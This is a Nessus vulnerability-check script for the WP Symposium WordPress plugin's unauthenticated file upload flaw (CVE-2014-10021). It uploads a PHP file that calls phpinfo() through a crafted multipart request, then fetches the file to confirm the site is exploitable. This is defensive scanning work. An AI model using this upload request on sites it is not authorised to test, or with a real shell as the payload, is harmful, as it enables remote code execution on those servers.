#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(105372);
  script_version("1.6");
  script_cvs_date("Date: 2019/11/12");

  script_cve_id("CVE-2014-10021");
  script_bugtraq_id(71686);
  script_xref(name:"EDB-ID", value:"35778");

  script_name(english:"WP Symposium Plugin Arbitrary File Upload");
  script_summary(english:"Checks for file upload vulnerability.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is running a PHP application that is affected
by a file upload vulnerability");
  script_set_attribute(attribute:"description", value:
"The WP Symposium Plugin for WordPress running on the remote web
server is affected with an remote file upload vulnerability. A remote,
unauthenticated attacker can exploit this vulnerability, via a 
specially crafted request, allowing an attacker to execute arbitrary
code on the target web application.");
  script_set_attribute(attribute:"see_also", value:"https://wordpress.org/plugins/wp-symposium/");
  script_set_attribute(attribute:"see_also", value:"https://www.exploit-db.com/exploits/35543");
  script_set_attribute(attribute:"solution", value:
"Upgrade the WP Symposium Plugin for WordPress to version 14.12 or
later and review the /plugins/wp-symposium/server/php directory and
subdirectories for malicious content");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2014-10021");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/12/15");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/12/11");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/12/19");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2017-2019 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);
plugin_url = install_url + "wp-content/plugins/wp-symposium/";
vuln_url = "/wp-content/plugins/wp-symposium/server/php/index.php";

plugin = "WP Symposium";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  # Check for the following string in the url indicated below
  regexes[0] = make_list("symposium");
  checks["/wp-content/plugins/wp-symposium/js/wps.js"] = regexes;

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}

if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

# Script name variables
time = unixtime();
script  = SCRIPT_NAME - ".nasl" + "-" + time + ".php";

# setting value static while for single instance
payload = script;

# Form  our PHP file to upload
php_shell = '--XnessusX\r\nContent-Disposition: form-data; name="uploader_uid"\n\n1\n--XnessusX\nContent-Disposition: form-data; name="uploader_dir"\n\n./Nessus/\n--XnessusX\nContent-Disposition: form-data; name="uploader_url"\n\n/wp-content/plugins/wp-symposium/server/php\n--XnessusX\nContent-Disposition: form-data; name="files[]"; filename=' + payload + '\nContent-Type: application/x-php\n\n<?php phpinfo();?>\n--XnessusX--\r\n';

# Attempt upload
post_res = http_send_recv3(
  method    : "POST",
  item      : vuln_url,
  data      : php_shell,
  add_headers:
    make_array("Content-Type",
               "multipart/form-data; boundary=XnessusX"),
  port         : port,
  exit_on_fail : TRUE
);

exp_request = http_last_sent_request();

# Try accessing the file we created
upload_loc = "/wp-content/plugins/wp-symposium/server/php/Nessus/" + payload;
payload_loc = install_url + upload_loc;

get_res = http_send_recv3(
  method       : "GET",
  item         : upload_loc,
  port         : port,
  exit_on_fail : TRUE
);

body = get_res[2];
pat = '(?s:<tr><td class="e">System(.+)<td class="e">PHP API)';
match = pregmatch(pattern:pat, string:body);

if (!empty_or_null(match)){
  output = match[0];
  security_report_v4(
    port        : port,
    severity    : SECURITY_HOLE,
    request     : make_list(exp_request),
    output      : chomp(output),
    generic     : TRUE,
    rep_extra   : "Manually remove the file created by Nessus: " +  payload_loc
    );
  }
else audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + ' plugin');
